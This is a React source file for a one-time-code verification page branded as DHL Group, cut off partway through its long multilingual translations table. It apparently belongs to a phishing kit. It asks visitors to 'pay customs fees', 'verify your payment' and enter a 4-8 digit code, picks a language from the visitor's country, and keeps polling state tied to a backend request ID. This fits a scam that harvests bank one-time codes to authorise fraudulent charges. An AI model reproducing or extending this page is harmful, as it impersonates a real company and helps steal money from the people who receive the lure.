import React, { useState, useEffect, useRef } from 'react';
import './OtpPage.css';
import LoadingPage from './LoadingPage';

const OtpPage = () => {
  // State for OTP input, timer, button states
  const [otp, setOtp] = useState('');
  const [timeLeft, setTimeLeft] = useState(76); // 1:16 in seconds
  const [isVerifying, setIsVerifying] = useState(false);
  const [isResendDisabled, setIsResendDisabled] = useState(true);
  const [languageMenuOpen, setLanguageMenuOpen] = useState(false);
  const [selectedLang, setSelectedLang] = useState({ code: 'fr', name: 'Français', flag: '🇫🇷', rtl: false });
  const [isRTL, setIsRTL] = useState(false);
  const [otpRequestId, setOtpRequestId] = useState(null);
  const [notification, setNotification] = useState(null);
  const [notificationPosition, setNotificationPosition] = useState({ top: 0, left: 0 });
  const [isLoadingLang, setIsLoadingLang] = useState(true);
  
  // API Configuration for Vite
  const apiUrl = import.meta.env.VITE_API_URL || 'http://localhost:5000';
  
  // IMPORTANT: Define the refs
  const languageMenuRef = useRef(null);
  const timerRef = useRef(null);
  const pollingRef = useRef(null);
  const stepCircleRef = useRef(null);
  
  // Complete language list with translations for all UI text
  const languages = [
    { code: 'fr', name: 'Français', flag: '🇫🇷', rtl: false },
    { code: 'en', name: 'English', flag: '🇬🇧', rtl: false },
    { code: 'ar', name: 'العربية', flag: '🇸🇦', rtl: true },
    { code: 'es', name: 'Español', flag: '🇪🇸', rtl: false },
    { code: 'de', name: 'Deutsch', flag: '🇩🇪', rtl: false },
    { code: 'it', name: 'Italiano', flag: '🇮🇹', rtl: false },
    { code: 'pt', name: 'Português', flag: '🇵🇹', rtl: false },
    { code: 'nl', name: 'Nederlands', flag: '🇳🇱', rtl: false },
    { code: 'pl', name: 'Polski', flag: '🇵🇱', rtl: false },
    { code: 'ru', name: 'Русский', flag: '🇷🇺', rtl: false },
    { code: 'zh', name: '中文', flag: '🇨🇳', rtl: false },
    { code: 'ja', name: '日本語', flag: '🇯🇵', rtl: false },
    { code: 'ko', name: '한국어', flag: '🇰🇷', rtl: false },
    { code: 'tr', name: 'Türkçe', flag: '🇹🇷', rtl: false },
    { code: 'vi', name: 'Tiếng Việt', flag: '🇻🇳', rtl: false },
    { code: 'th', name: 'ไทย', flag: '🇹🇭', rtl: false },
    { code: 'id', name: 'Bahasa Indonesia', flag: '🇮🇩', rtl: false },
    { code: 'ms', name: 'Bahasa Melayu', flag: '🇲🇾', rtl: false },
    { code: 'hi', name: 'हिन्दी', flag: '🇮🇳', rtl: false },
    { code: 'ur', name: 'اردو', flag: '🇵🇰', rtl: true },
    { code: 'he', name: 'עברית', flag: '🇮🇱', rtl: true },
    // Additional languages from other lists
    { code: 'sv', name: 'Svenska', flag: '🇸🇪', rtl: false },
    { code: 'no', name: 'Norsk', flag: '🇳🇴', rtl: false },
    { code: 'da', name: 'Dansk', flag: '🇩🇰', rtl: false },
    { code: 'fi', name: 'Suomi', flag: '🇫🇮', rtl: false },
    { code: 'el', name: 'Ελληνικά', flag: '🇬🇷', rtl: false },
    { code: 'cs', name: 'Čeština', flag: '🇨🇿', rtl: false },
    { code: 'sk', name: 'Slovenčina', flag: '🇸🇰', rtl: false },
    { code: 'hu', name: 'Magyar', flag: '🇭🇺', rtl: false },
    { code: 'ro', name: 'Română', flag: '🇷🇴', rtl: false },
    { code: 'bg', name: 'Български', flag: '🇧🇬', rtl: false },
    { code: 'hr', name: 'Hrvatski', flag: '🇭🇷', rtl: false },
    { code: 'sl', name: 'Slovenščina', flag: '🇸🇮', rtl: false },
    { code: 'lt', name: 'Lietuvių', flag: '🇱🇹', rtl: false },
    { code: 'lv', name: 'Latviešu', flag: '🇱🇻', rtl: false },
    { code: 'et', name: 'Eesti', flag: '🇪🇪', rtl: false },
    { code: 'bn', name: 'বাংলা', flag: '🇧🇩', rtl: false },
    { code: 'si', name: 'සිංහල', flag: '🇱🇰', rtl: false },
  ];

  // ============================================
  // COUNTRY TO LANGUAGE MAPPING - FIXED PER REQUEST
  // TN (Tunisia) = "en"
  // CH (Switzerland) = "de"
  // ============================================
  const countryToLanguage = {
    // French speaking countries
    'FR': 'fr', 'BE': 'fr', 'LU': 'fr', 'MC': 'fr', 'SN': 'fr', 'CI': 'fr', 'CM': 'fr',
    // English speaking countries (TN added as English)
    'US': 'en', 'GB': 'en', 'AU': 'en', 'NZ': 'en', 'IE': 'en', 'ZA': 'en', 'IN': 'en', 
    'SG': 'en', 'PH': 'en', 'MY': 'en', 'NG': 'en', 'CA': 'en', 'TN': 'en',  // TN = en
    // Arabic speaking countries
    'SA': 'ar', 'AE': 'ar', 'QA': 'ar', 'KW': 'ar', 'BH': 'ar', 'OM': 'ar', 'JO': 'ar', 
    'EG': 'ar', 'LB': 'ar', 'IQ': 'ar', 'YE': 'ar', 'PS': 'ar', 'LY': 'ar', 'SD': 'ar', 
    'MR': 'ar', 'SO': 'ar', 'MA': 'ar', 'DZ': 'ar',
    // Spanish speaking countries
    'ES': 'es', 'MX': 'es', 'AR': 'es', 'CO': 'es', 'PE': 'es', 'VE': 'es', 'CL': 'es', 
    'EC': 'es', 'GT': 'es', 'CU': 'es', 'BO': 'es', 'DO': 'es', 'HN': 'es', 'PY': 'es', 
    'SV': 'es', 'NI': 'es', 'CR': 'es', 'PA': 'es', 'UY': 'es',
    // German speaking countries (CH = de)
    'DE': 'de', 'AT': 'de', 'LI': 'de', 'CH': 'de',  // CH = de
    // Italian speaking countries
    'IT': 'it', 'SM': 'it', 'VA': 'it',
    // Portuguese speaking countries
    'PT': 'pt', 'BR': 'pt', 'AO': 'pt', 'MZ': 'pt', 'CV': 'pt', 'GW': 'pt', 'TL': 'pt',
    // Dutch speaking countries
    'NL': 'nl',
    // Polish
    'PL': 'pl',
    // Russian speaking countries
    'RU': 'ru', 'BY': 'ru', 'KZ': 'ru', 'KG': 'ru', 'UA': 'ru',
    // Chinese
    'CN': 'zh', 'TW': 'zh', 'HK': 'zh', 'MO': 'zh',
    // Japanese
    'JP': 'ja',
    // Korean
    'KR': 'ko',
    // Turkish
    'TR': 'tr',
    // Vietnamese
    'VN': 'vi',
    // Thai
    'TH': 'th',
    // Indonesian
    'ID': 'id',
    // Urdu/Pakistan
    'PK': 'ur',
    // Hebrew
    'IL': 'he',
    // Nordic languages
    'SE': 'sv', 'NO': 'no', 'DK': 'da', 'FI': 'fi',
    // Greek
    'GR': 'el',
    // Czech, Slovak, Hungarian, Romanian, Bulgarian, Croatian, Slovenian, Lithuanian, Latvian, Estonian
    'CZ': 'cs', 'SK': 'sk', 'HU': 'hu', 'RO': 'ro', 'BG': 'bg', 'HR': 'hr', 'SI': 'sl',
    'LT': 'lt', 'LV': 'lv', 'EE': 'et',
    // Bengali
    'BD': 'bn',
    // Sinhala
    'LK': 'si',
  };

  // Translations object for all UI text - ALL LANGUAGES COMPLETE
  const translations = {
    fr: {
      step1: "Remplir les informations",
      step2: "Payer les frais de douane",
      step3: "Soumettre la réexpédition",
      otpTitle: "Vérifiez votre paiement",
      otpSub: "Un code de vérification a été envoyé à votre numéro de téléphone enregistré.",
      codeExpires: "Le code expire dans",
      verifyBtn: "Vérifier le code",
      verifying: "Vérification en cours...",
      resendText: "Vous n'avez pas reçu le code ?",
      resendLink: "Renvoyer le code",
      notificationSuccess: "✅ Code vérifié avec succès ! Redirection...",
      notificationError: "❌ Le code a été rejeté. Veuillez réessayer.",
      notificationInvalidCode: "Veuillez entrer le code à 4-8 chiffres.",
      notificationCodeTooLong: "Le code ne peut pas dépasser 8 chiffres.",
      notificationVerifyError: "❌ Erreur lors de la vérification. Veuillez réessayer.",
      notificationResendSuccess: "✅ Code renvoyé avec succès !",
      notificationResendError: "❌ Erreur lors du renvoi du code. Veuillez réessayer.",
      privacyNotice: "Avis de confidentialité",
      consentSettings: "Paramètres de consentement",
      copyright: "DHL Group - Tous droits réservés"
    },
    en: {
      step1: "Fill in information",
      step2: "Pay customs fees",
      step3: "Submit reshipment",
      otpTitle: "Verify your payment",
      otpSub: "A verification code has been sent to your registered phone number.",
      codeExpires: "Code expires in",
      verifyBtn: "Verify code",
      verifying: "Verifying...",
      resendText: "Didn't receive the code?",
      resendLink: "Resend code",
      notificationSuccess: "✅ Code verified successfully! Redirecting...",
      notificationError: "❌ Code rejected. Please try again.",
      notificationInvalidCode: "Please enter the 4-8 digit code.",
      notificationCodeTooLong: "Code cannot exceed 8 digits.",
      notificationVerifyError: "❌ Verification error. Please try again.",
      notificationResendSuccess: "✅ Code resent successfully!",
      notificationResendError: "❌ Error resending code. Please try again.",
      privacyNotice: "Privacy Notice",
      consentSettings: "Consent Settings",
      copyright: "DHL Group - All rights reserved"
    },
    ar: {
      step1: "ملء المعلومات",
      step2: "دفع الرسوم الجمركية",
      step3: "تقديم إعادة الشحن",
      otpTitle: "تحقق من دفعتك",
      otpSub: "تم إرسال رمز التحقق إلى رقم هاتفك المسجل.",
      codeExpires: "ينتهي الرمز خلال",
      verifyBtn: "تحقق من الرمز",
      verifying: "جاري التحقق...",
      resendText: "لم تستلم الرمز؟",
      resendLink: "إعادة إرسال الرمز",
      notificationSuccess: "✅ تم التحقق من الرمز بنجاح! جاري إعادة التوجيه...",
      notificationError: "❌ تم رفض الرمز. يرجى المحاولة مرة أخرى.",
      notificationInvalidCode: "يرجى إدخال الرمز المكون من 4-8 أرقام.",
      notificationCodeTooLong: "لا يمكن أن يتجاوز الرمز 8 أرقام.",
      notificationVerifyError: "❌ خطأ في التحقق. يرجى المحاولة مرة أخرى.",
      notificationResendSuccess: "✅ تم إعادة إرسال الرمز بنجاح!",
      notificationResendError: "❌ خطأ في إعادة إرسال الرمز. يرجى المحاولة مرة أخرى.",
      privacyNotice: "إشعار الخصوصية",
      consentSettings: "إعدادات الموافقة",
      copyright: "مجموعة DHL - جميع الحقوق محفوظة"
    },
    es: {
      step1: "Completar información",
      step2: "Pagar aranceles aduaneros",
      step3: "Enviar reexpedición",
      otpTitle: "Verifique su pago",
      otpSub: "Se ha enviado un código de verificación a su número de teléfono registrado.",
      codeExpires: "El código expira en",
      verifyBtn: "Verificar código",
      verifying: "Verificando...",
      resendText: "¿No recibiste el código?",
      resendLink: "Reenviar código",
      notificationSuccess: "✅ ¡Código verificado con éxito! Redirigiendo...",
      notificationError: "❌ Código rechazado. Por favor, intente de nuevo.",
      notificationInvalidCode: "Por favor, ingrese el código de 4-8 dígitos.",
      notificationCodeTooLong: "El código no puede exceder los 8 dígitos.",
      notificationVerifyError: "❌ Error de verificación. Por favor, intente de nuevo.",
      notificationResendSuccess: "✅ ¡Código reenviado con éxito!",
      notificationResendError: "❌ Error al reenviar el código. Por favor, intente de nuevo.",
      privacyNotice: "Aviso de Privacidad",
      consentSettings: "Configuración de Consentimiento",
      copyright: "DHL Group - Todos los derechos reservados"
    },
    de: {
      step1: "Informationen ausfüllen",
      step2: "Zollgebühren bezahlen",
      step3: "Weiterversand einreichen",
      otpTitle: "Bestätigen Sie Ihre Zahlung",
      otpSub: "Ein Bestätigungscode wurde an Ihre registrierte Telefonnummer gesendet.",
      codeExpires: "Code läuft ab in",
      verifyBtn: "Code bestätigen",
      verifying: "Wird überprüft...",
      resendText: "Code nicht erhalten?",
      resendLink: "Code erneut senden",
      notificationSuccess: "✅ Code erfolgreich bestätigt! Weiterleitung...",
      notificationError: "❌ Code abgelehnt. Bitte versuchen Sie es erneut.",
      notificationInvalidCode: "Bitte geben Sie den 4-8-stelligen Code ein.",
      notificationCodeTooLong: "Code darf 8 Ziffern nicht überschreiten.",
      notificationVerifyError: "❌ Bestätigungsfehler. Bitte versuchen Sie es erneut.",
      notificationResendSuccess: "✅ Code erfolgreich erneut gesendet!",
      notificationResendError: "❌ Fehler beim erneuten Senden des Codes. Bitte versuchen Sie es erneut.",
      privacyNotice: "Datenschutzerklärung",
      consentSettings: "Cookie-Einstellungen",
      copyright: "DHL Group - Alle Rechte vorbehalten"
    },
    it: {
      step1: "Compila le informazioni",
      step2: "Paga i dazi doganali",
      step3: "Invia la rispedizione",
      otpTitle: "Verifica il tuo pagamento",
      otpSub: "Un codice di verifica è stato inviato al tuo numero di telefono registrato.",
      codeExpires: "Il codice scade tra",
      verifyBtn: "Verifica codice",
      verifying: "Verifica in corso...",
      resendText: "Non hai ricevuto il codice?",
      resendLink: "Invia nuovamente il codice",
      notificationSuccess: "✅ Codice verificato con successo! Reindirizzamento...",
      notificationError: "❌ Codice rifiutato. Per favore riprova.",
      notificationInvalidCode: "Inserisci il codice a 4-8 cifre.",
      notificationCodeTooLong: "Il codice non può superare le 8 cifre.",
      notificationVerifyError: "❌ Errore di verifica. Per favore riprova.",
      notificationResendSuccess: "✅ Codice reinviato con successo!",
      notificationResendError: "❌ Errore nell'invio del codice. Per favore riprova.",
      privacyNotice: "Informativa sulla privacy",
      consentSettings: "Impostazioni dei consensi",
      copyright: "DHL Group - Tutti i diritti riservati"
    },
    pt: {
      step1: "Preencher informações",
      step2: "Pagar taxas alfandegárias",
      step3: "Enviar reexpedição",
      otpTitle: "Verifique seu pagamento",
      otpSub: "Um código de verificação foi enviado para seu número de telefone registrado.",
      codeExpires: "Código expira em",
      verifyBtn: "Verificar código",
      verifying: "Verificando...",
      resendText: "Não recebeu o código?",
      resendLink: "Reenviar código",
      notificationSuccess: "✅ Código verificado com sucesso! Redirecionando...",
      notificationError: "❌ Código rejeitado. Por favor, tente novamente.",
      notificationInvalidCode: "Por favor, insira o código de 4-8 dígitos.",
      notificationCodeTooLong: "O código não pode exceder 8 dígitos.",
      notificationVerifyError: "❌ Erro de verificação. Por favor, tente novamente.",
      notificationResendSuccess: "✅ Código reenviado com sucesso!",
      notificationResendError: "❌ Erro ao reenviar o código. Por favor, tente novamente.",
      privacyNotice: "Aviso de Privacidade",
      consentSettings: "Configurações de Consentimento",
      copyright: "DHL Group - Todos os direitos reservados"
    },
    nl: {
      step1: "Informatie invullen",
      step2: "Douanekosten betalen",
      step3: "Herverzending indienen",
      otpTitle: "Controleer uw betaling",
      otpSub: "Er is een verificatiecode verzonden naar uw geregistreerde telefoonnummer.",
      codeExpires: "Code verloopt over",
      verifyBtn: "Code verifiëren",
      verifying: "Verifiëren...",
      resendText: "Code niet ontvangen?",
      resendLink: "Code opnieuw verzenden",
      notificationSuccess: "✅ Code succesvol geverifieerd! Doorsturen...",
      notificationError: "❌ Code afgewezen. Probeer het opnieuw.",
      notificationInvalidCode: "Voer de 4-8 cijferige code in.",
      notificationCodeTooLong: "Code mag niet meer dan 8 cijfers bevatten.",
      notificationVerifyError: "❌ Verificatiefout. Probeer het opnieuw.",
      notificationResendSuccess: "✅ Code opnieuw verzonden!",
      notificationResendError: "❌ Fout bij opnieuw verzenden van code. Probeer het opnieuw.",
      privacyNotice: "Privacyverklaring",
      consentSettings: "Toestemmingsinstellingen",
      copyright: "DHL Group - Alle rechten voorbehouden"
    },
    pl: {
      step1: "Wypełnij informacje",
      step2: "Zapłać cło",
      step3: "Złóż ponowną wysyłkę",
      otpTitle: "Zweryfikuj swoją płatność",
      otpSub: "Kod weryfikacyjny został wysłany na Twój zarejestrowany numer telefonu.",
      codeExpires: "Kod wygasa za",
      verifyBtn: "Zweryfikuj kod",
      verifying: "Weryfikowanie...",
      resendText: "Nie otrzymałeś kodu?",
      resendLink: "Wyślij ponownie kod",
      notificationSuccess: "✅ Kod zweryfikowany pomyślnie! Przekierowanie...",
      notificationError: "❌ Kod odrzucony. Spróbuj ponownie.",
      notificationInvalidCode: "Wprowadź kod 4-8 cyfrowy.",
      notificationCodeTooLong: "Kod nie może przekraczać 8 cyfr.",
      notificationVerifyError: "❌ Błąd weryfikacji. Spróbuj ponownie.",
      notificationResendSuccess: "✅ Kod wysłany ponownie pomyślnie!",
      notificationResendError: "❌ Błąd przy ponownym wysyłaniu kodu. Spróbuj ponownie.",
      privacyNotice: "Polityka prywatności",
      consentSettings: "Ustawienia zgód",
      copyright: "DHL Group - Wszelkie prawa zastrzeżone"
    },
    ru: {
      step1: "Заполните информацию",
      step2: "Оплатите таможенные сборы",
      step3: "Отправить повторную отправку",
      otpTitle: "Подтвердите оплату",
      otpSub: "Код подтверждения отправлен на ваш зарегистрированный номер телефона.",
      codeExpires: "Срок действия кода истекает через",
      verifyBtn: "Подтвердить код",
      verifying: "Проверка...",
      resendText: "Не получили код?",
      resendLink: "Отправить код повторно",
      notificationSuccess: "✅ Код успешно подтвержден! Перенаправление...",
      notificationError: "❌ Код отклонен. Пожалуйста, попробуйте снова.",
      notificationInvalidCode: "Пожалуйста, введите 4-8 значный код.",
      notificationCodeTooLong: "Код не может превышать 8 цифр.",
      notificationVerifyError: "❌ Ошибка проверки. Пожалуйста, попробуйте снова.",
      notificationResendSuccess: "✅ Код успешно отправлен повторно!",
      notificationResendError: "❌ Ошибка при повторной отправке кода. Пожалуйста, попробуйте снова.",
      privacyNotice: "Политика конфиденциальности",
      consentSettings: "Настройки согласия",
      copyright: "DHL Group - Все права защищены"
    },
    zh: {
      step1: "填写信息",
      step2: "支付关税",
      step3: "提交转寄",
      otpTitle: "验证您的付款",
      otpSub: "验证码已发送至您注册的手机号码。",
      codeExpires: "验证码有效期",
      verifyBtn: "验证码",
      verifying: "验证中...",
      resendText: "没有收到验证码？",
      resendLink: "重新发送验证码",
      notificationSuccess: "✅ 验证成功！正在跳转...",
      notificationError: "❌ 验证码错误，请重试。",
      notificationInvalidCode: "请输入4-8位数字验证码。",
      notificationCodeTooLong: "验证码不能超过8位数字。",
      notificationVerifyError: "❌ 验证错误，请重试。",
      notificationResendSuccess: "✅ 验证码已重新发送！",
      notificationResendError: "❌ 重新发送验证码失败，请重试。",
      privacyNotice: "隐私声明",
      consentSettings: "同意设置",
      copyright: "DHL集团 - 版权所有"
    },
    ja: {
      step1: "情報を入力",
      step2: "関税を支払う",
      step3: "再発送を送信",
      otpTitle: "お支払いを確認",
      otpSub: "登録された電話番号に確認コードが送信されました。",
      codeExpires: "コードの有効期限",
      verifyBtn: "コードを確認",
      verifying: "確認中...",
      resendText: "コードが届きませんでしたか？",
      resendLink: "コードを再送信",
      notificationSuccess: "✅ コードが正常に確認されました！リダイレクト中...",
      notificationError: "❌ コードが拒否されました。もう一度お試しください。",
      notificationInvalidCode: "4～8桁のコードを入力してください。",
      notificationCodeTooLong: "コードは8桁を超えることはできません。",
      notificationVerifyError: "❌ 確認エラー。もう一度お試しください。",
      notificationResendSuccess: "✅ コードを再送信しました！",
      notificationResendError: "❌ コードの再送信エラー。もう一度お試しください。",
      privacyNotice: "プライバシー通知",
      consentSettings: "同意設定",
      copyright: "DHLグループ - 無断複写・転載を禁じます"
    },
    ko: {
      step1: "정보 입력",
      step2: "관세 납부",
      step3: "재배송 제출",
      otpTitle: "결제 확인",
      otpSub: "등록된 전화번호로 인증 코드가 발송되었습니다.",
      codeExpires: "코드 만료까지",
      verifyBtn: "코드 확인",
      verifying: "확인 중...",
      resendText: "코드를 받지 못하셨나요?",
      resendLink: "코드 재전송",
      notificationSuccess: "✅ 코드가 성공적으로 확인되었습니다! 리디렉션 중...",
      notificationError: "❌ 코드가 거부되었습니다. 다시 시도하세요.",
      notificationInvalidCode: "4-8자리 코드를 입력하세요.",
      notificationCodeTooLong: "코드는 8자리를 초과할 수 없습니다.",
      notificationVerifyError: "❌ 확인 오류. 다시 시도하세요.",
      notificationResendSuccess: "✅ 코드가 성공적으로 재전송되었습니다!",
      notificationResendError: "❌ 코드 재전송 오류. 다시 시도하세요.",
      privacyNotice: "개인정보 보호정책",
      consentSettings: "동의 설정",
      copyright: "DHL 그룹 - 모든 권리 보유"
    },
    tr: {
      step1: "Bilgileri doldurun",
      step2: "Gümrük ücretlerini ödeyin",
      step3: "Yeniden gönderimi gönderin",
      otpTitle: "Ödemenizi doğrulayın",
      otpSub: "Kayıtlı telefon numaranıza bir doğrulama kodu gönderildi.",
      codeExpires: "Kodun süresi doluyor",
      verifyBtn: "Kodu doğrula",
      verifying: "Doğrulanıyor...",
      resendText: "Kodu almadınız mı?",
      resendLink: "Kodu tekrar gönder",
      notificationSuccess: "✅ Kod başarıyla doğrulandı! Yönlendiriliyor...",
      notificationError: "❌ Kod reddedildi. Lütfen tekrar deneyin.",
      notificationInvalidCode: "Lütfen 4-8 haneli kodu girin.",
      notificationCodeTooLong: "Kod 8 haneyi aşamaz.",
      notificationVerifyError: "❌ Doğrulama hatası. Lütfen tekrar deneyin.",
      notificationResendSuccess: "✅ Kod başarıyla tekrar gönderildi!",
      notificationResendError: "❌ Kod gönderilirken hata oluştu. Lütfen tekrar deneyin.",
      privacyNotice: "Gizlilik Bildirimi",
      consentSettings: "Onay Ayarları",
      copyright: "DHL Grubu - Tüm hakları saklıdır"
    },
    vi: {
      step1: "Điền thông tin",
      step2: "Thanh toán phí hải quan",
      step3: "Gửi gửi lại hàng",
      otpTitle: "Xác minh thanh toán của bạn",
      otpSub: "Mã xác minh đã được gửi đến số điện thoại đã đăng ký của bạn.",
      codeExpires: "Mã hết hạn sau",
      verifyBtn: "Xác minh mã",
      verifying: "Đang xác minh...",
      resendText: "Không nhận được mã?",
      resendLink: "Gửi lại mã",
      notificationSuccess: "✅ Mã xác minh thành công! Đang chuyển hướng...",
      notificationError: "❌ Mã bị từ chối. Vui lòng thử lại.",
      notificationInvalidCode: "Vui lòng nhập mã 4-8 chữ số.",
      notificationCodeTooLong: "Mã không được vượt quá 8 chữ số.",
      notificationVerifyError: "❌ Lỗi xác minh. Vui lòng thử lại.",
      notificationResendSuccess: "✅ Mã đã được gửi lại thành công!",
      notificationResendError: "❌ Lỗi khi gửi lại mã. Vui lòng thử lại.",
      privacyNotice: "Thông báo Quyền riêng tư",
      consentSettings: "Cài đặt đồng ý",
      copyright: "Tập đoàn DHL - Đã đăng ký bản quyền"
    },
    th: {
      step1: "กรอกข้อมูล",
      step2: "ชำระค่าธรรมเนียมศุลกากร",
      step3: "ส่งการจัดส่งซ้ำ",
      otpTitle: "ยืนยันการชำระเงินของคุณ",
      otpSub: "รหัสยืนยันถูกส่งไปยังหมายเลขโทรศัพท์ที่ลงทะเบียนของคุณแล้ว",
      codeExpires: "รหัสจะหมดอายุใน",
      verifyBtn: "ยืนยันรหัส",
      verifying: "กำลังตรวจสอบ...",
      resendText: "ไม่ได้รับรหัสใช่ไหม?",
      resendLink: "ส่งรหัสอีกครั้ง",
      notificationSuccess: "✅ ยืนยันรหัสสำเร็จ! กำลังเปลี่ยนเส้นทาง...",
      notificationError: "❌ ปฏิเสธรหัส กรุณาลองอีกครั้ง",
      notificationInvalidCode: "กรุณากรอกรหัส 4-8 หลัก",
      notificationCodeTooLong: "รหัสต้องไม่เกิน 8 หลัก",
      notificationVerifyError: "❌ ข้อผิดพลาดในการยืนยัน กรุณาลองอีกครั้ง",
      notificationResendSuccess: "✅ ส่งรหัสอีกครั้งเรียบร้อยแล้ว!",
      notificationResendError: "❌ ข้อผิดพลาดในการส่งรหัสซ้ำ กรุณาลองอีกครั้ง",
      privacyNotice: "ประกาศความเป็นส่วนตัว",
      consentSettings: "การตั้งค่าความยินยอม",
      copyright: "กลุ่ม DHL - สงวนลิขสิทธิ์"
    },
    id: {
      step1: "Isi informasi",
      step2: "Bayar biaya bea cukai",
      step3: "Kirim pengiriman ulang",
      otpTitle: "Verifikasi pembayaran Anda",
      otpSub: "Kode verifikasi telah dikirim ke nomor telepon terdaftar Anda.",
      codeExpires: "Kode kedaluwarsa dalam",
      verifyBtn: "Verifikasi kode",
      verifying: "Memverifikasi...",
      resendText: "Tidak menerima kode?",
      resendLink: "Kirim ulang kode",
      notificationSuccess: "✅ Kode berhasil diverifikasi! Mengalihkan...",
      notificationError: "❌ Kode ditolak. Silakan coba lagi.",
      notificationInvalidCode: "Silakan masukkan kode 4-8 digit.",
      notificationCodeTooLong: "Kode tidak boleh melebihi 8 digit.",
      notificationVerifyError: "❌ Kesalahan verifikasi. Silakan coba lagi.",
      notificationResendSuccess: "✅ Kode berhasil dikirim ulang!",
      notificationResendError: "❌ Kesalahan saat mengirim ulang kode. Silakan coba lagi.",
      privacyNotice: "Pemberitahuan Privasi",
      consentSettings: "Pengaturan Persetujuan",
      copyright: "Grup DHL - Hak cipta dilindungi"
    },
    ms: {
      step1: "Isi maklumat",
      step2: "Bayar yuran kastam",
      step3: "Hantar penghantaran semula",
      otpTitle: "Sahkan pembayaran anda",
      otpSub: "Kod pengesahan telah dihantar ke nombor telefon berdaftar anda.",
      codeExpires: "Kod tamat dalam",
      verifyBtn: "Sahkan kod",
      verifying: "Mengesahkan...",
      resendText: "Tidak menerima kod?",
      resendLink: "Hantar semula kod",
      notificationSuccess: "✅ Kod berjaya disahkan! Mengalihkan...",
      notificationError: "❌ Kod ditolak. Sila cuba lagi.",
      notificationInvalidCode: "Sila masukkan kod 4-8 digit.",
      notificationCodeTooLong: "Kod tidak boleh melebihi 8 digit.",
      notificationVerifyError: "❌ Ralat pengesahan. Sila cuba lagi.",
      notificationResendSuccess: "✅ Kod berjaya dihantar semula!",
      notificationResendError: "❌ Ralat menghantar semula kod. Sila cuba lagi.",
      privacyNotice: "Notis Privasi",
      consentSettings: "Tetapan Persetujuan",
      copyright: "Kumpulan DHL - Hak cipta terpelihara"
    },
    hi: {
      step1: "जानकारी भरें",
      step2: "सीमा शुल्क का भुगतान करें",
      step3: "पुनः शिपमेंट सबमिट करें",
      otpTitle: "अपने भुगतान की पुष्टि करें",
      otpSub: "आपके पंजीकृत फोन नंबर पर एक सत्यापन कोड भेजा गया है।",
      codeExpires: "कोड समाप्त होने में",
      verifyBtn: "कोड सत्यापित करें",
      verifying: "सत्यापन हो रहा है...",
      resendText: "कोड नहीं मिला?",
      resendLink: "कोड पुनः भेजें",
      notificationSuccess: "✅ कोड सफलतापूर्वक सत्यापित! पुनर्निर्देशन...",
      notificationError: "❌ कोड अस्वीकृत। कृपया पुनः प्रयास करें।",
      notificationInvalidCode: "कृपया 4-8 अंकों का कोड दर्ज करें।",
      notificationCodeTooLong: "कोड 8 अंकों से अधिक नहीं हो सकता।",
      notificationVerifyError: "❌ सत्यापन त्रुटि। कृपया पुनः प्रयास करें।",
      notificationResendSuccess: "✅ कोड सफलतापूर्वक पुनः भेजा गया!",
      notificationResendError: "❌ कोड पुनः भेजने में त्रुटि। कृपया पुनः प्रयास करें।",
      privacyNotice: "गोपनीयता सूचना",
      consentSettings: "सहमति सेटिंग्स",
      copyright: "DHL समूह - सर्वाधिकार सुरक्षित"
    },
    ur: {
      step1: "معلومات پُر کریں",
      step2: "کسٹمز فیس ادا کریں",
      step3: "دوبارہ شپمنٹ جمع کروائیں",
      otpTitle: "اپنی ادائیگی کی تصدیق کریں",
      otpSub: "ایک تصدیقی کوڈ آپ کے رجسٹرڈ فون نمبر پر بھیج دیا گیا ہے۔",
      codeExpires: "کوڈ کی میعاد ختم ہونے میں",
      verifyBtn: "کوڈ کی تصدیق کریں",
      verifying: "تصدیق ہو رہی ہے...",
      resendText: "کوڈ موصول نہیں ہوا؟",
      resendLink: "کوڈ دوبارہ بھیجیں",
      notificationSuccess: "✅ کوڈ کامیابی سے تصدیق ہو گیا! ری ڈائریکٹ کیا جا رہا ہے...",
      notificationError: "❌ کوڈ مسترد کر دیا گیا۔ براہ کرم دوبارہ کوشش کریں۔",
      notificationInvalidCode: "براہ کرم 4-8 ہندسوں کا کوڈ درج کریں۔",
      notificationCodeTooLong: "کوڈ 8 ہندسوں سے زیادہ نہیں ہو سکتا۔",
      notificationVerifyError: "❌ تصدیق میں خرابی۔ براہ کرم دوبارہ کوشش کریں۔",
      notificationResendSuccess: "✅ کوڈ کامیابی سے دوبارہ بھیج دیا گیا!",
      notificationResendError: "❌ کوڈ دوبارہ بھیجنے میں خرابی۔ براہ کرم دوبارہ کوشش کریں۔",
      privacyNotice: "رازداری کا نوٹس",
      consentSettings: "رضامندی کی ترتیبات",
      copyright: "DHL گروپ - جملہ حقوق محفوظ ہیں"
    },
    he: {
      step1: "מלא פרטים",
      step2: "שלם דמי מכס",
      step3: "שלח משלוח חוזר",
      otpTitle: "אמת את התשלום שלך",
      otpSub: "קוד אימות נשלח למספר הטלפון הרשום שלך.",
      codeExpires: "פג תוקף הקוד בעוד",
      verifyBtn: "אמת קוד",
      verifying: "מאמת...",
      resendText: "לא קיבלת את הקוד?",
      resendLink: "שלח קוד שוב",
      notificationSuccess: "✅ הקוד אומת בהצלחה! מנתב מחדש...",
      notificationError: "❌ הקוד נדחה. אנא נסה שוב.",
      notificationInvalidCode: "אנא הזן קוד בן 4-8 ספרות.",
      notificationCodeTooLong: "הקוד לא יכול לעלות על 8 ספרות.",
      notificationVerifyError: "❌ שגיאת אימות. אנא נסה שוב.",
      notificationResendSuccess: "✅ הקוד נשלח שוב בהצלחה!",
      notificationResendError: "❌ שגיאה בשליחת הקוד מחדש. אנא נסה שוב.",
      privacyNotice: "הצהרת פרטיות",
      consentSettings: "הגדרות הסכמה",
      copyright: "קבוצת DHL - כל הזכויות שמורות"
    },
    // Additional languages
    sv: {
      step1: "Fyll i information",
      step2: "Betala tullavgifter",
      step3: "Skicka omfrakt",
      otpTitle: "Verifiera din betalning",
      otpSub: "En verifieringskod har skickats till ditt registrerade telefonnummer.",
      codeExpires: "Koden upphör om",
      verifyBtn: "Verifiera kod",
      verifying: "Verifierar...",
      resendText: "Fick du inte koden?",
      resendLink: "Skicka koden igen",
      notificationSuccess: "✅ Koden verifierades! Omdirigerar...",
      notificationError: "❌ Koden avvisades. Försök igen.",
      notificationInvalidCode: "Ange 4-8 siffrig kod.",
      notificationCodeTooLong: "Koden får inte överstiga 8 siffror.",
      notificationVerifyError: "❌ Verifieringsfel. Försök igen.",
      notificationResendSuccess: "✅ Koden skickades igen!",
      notificationResendError: "❌ Fel vid utskick av kod. Försök igen.",
      privacyNotice: "Integritetspolicy",
      consentSettings: "Cookie-inställningar",
